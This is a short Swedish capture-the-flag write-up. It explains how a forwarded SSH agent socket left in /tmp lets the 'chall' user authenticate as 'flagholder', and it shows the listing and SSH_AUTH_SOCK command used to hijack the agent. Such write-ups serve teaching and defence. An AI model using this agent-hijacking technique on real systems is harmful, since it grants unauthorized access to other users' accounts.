# Hemlig agent

Kontot "flagholder" har en SSH-session till "chall"-kontot som deltagarna får åtkomst till. SSH-sessionen har agent forwarding aktiverat vilket gör det möjligt att återanvända sina SSH-nycklar för att ansluta till en annan maskin. För att det ska fungera skapas en SSH-agent-socket i `/tmp` som ägs av kontot som SSH-sessionen loggar in som. Det kontot (eller root) kan använda socketen för att skapa nya sessioner med SSH-nycklarna som agenten har inladdade, se "Security Issues With Key Agents" på http://unixwiz.net/techtips/ssh-agent-forwarding.html.

I uppgiften kan detta utnyttjas via:
```
chall@61887a389640:~$ ls -l /tmp/
total 0
drwx------ 1 chall      chall      16 Aug 28 11:34 ssh-XXXXRGT0NZ
drwx------ 1 flagholder flagholder 16 Aug 28 11:34 ssh-XXXXXXkUQTPM
chall@61887a389640:~$ SSH_AUTH_SOCK=/tmp/ssh-XXXXRGT0NZ/agent.33 ssh flagholder@localhost
[...]
flagholder@61887a389640:~$
```
